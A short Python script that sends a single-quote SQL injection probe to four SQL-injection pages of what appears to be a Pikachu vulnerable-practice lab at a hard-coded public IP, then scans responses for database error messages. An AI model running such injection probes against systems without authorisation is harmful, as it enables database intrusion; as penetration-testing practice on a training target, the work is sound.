import httpx

# 测试 Pikachu 多个 SQLi 页面
pages = [
    "/vul/sqli/sqli.php",
    "/vul/sqli/sqli_id.php",
    "/vul/sqli/sqli_str.php",
    "/vul/sqli/sqli_search.php",
]

for page in pages:
    url = f"http://47.95.192.41:8082{page}"
    try:
        # GET 请求带注入
        r = httpx.get(url, params={"id": "1'", "name": "1'"}, timeout=10)
        
        # 检查错误
        has_error = any(k in r.text.lower() for k in ['error', 'syntax', 'warning', 'mysql_fetch'])
        
        print(f"{page:30} Status: {r.status_code}, Error: {has_error}, Length: {len(r.text)}")
        
        if has_error:
            # 提取错误信息
            import re
            match = re.search(r'(error[^<]{0,100})', r.text, re.IGNORECASE)
            if match:
                print(f"  -> {match.group(1)}")
    except Exception as e:
        print(f"{page:30} Error: {e}")
